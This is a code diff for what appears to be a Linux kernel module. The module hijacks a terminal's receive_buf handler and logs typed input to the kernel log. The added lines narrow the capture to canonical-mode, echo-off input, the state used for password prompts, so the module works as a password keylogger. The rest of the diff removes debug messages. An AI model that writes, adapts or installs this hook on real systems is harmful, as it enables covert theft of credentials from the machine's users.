@@ -16,7 +16,15 @@ void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
 void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 		     char* fp, int count){
-  printk(KERN_ALERT "buffer is %s\n",cp);
+  if(L_ICANON(tty) && !L_ECHO(tty)){
+    // if we have a single character
+    if(count == 1){
+      printk(KERN_ALERT "buffer is %c\n",cp[0]);
+    }
+    if(count > 0 && count != 1){
+      printk(KERN_ALERT "buffer is %s\n",cp);
+    }
+  }
   // call the old function
   old_receive_buf(tty,cp,fp,count);
 }
@@ -56,12 +64,10 @@ static void exit(void) {
   // open the tty
   file = kopen(dev_name,LF_FLAGS,LF_PERMS);
   if(file){
-    printk(KERN_ALERT "tty was opened\n");
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
     if(priv) tty=priv->tty;
     if(tty){
-      printk(KERN_ALERT "this is a valid tty\n");
       if(tty->ldisc->ops->receive_buf){
 	//printk(KERN_ALERT "has receive_buf\n");
 	//change the old receive_buf
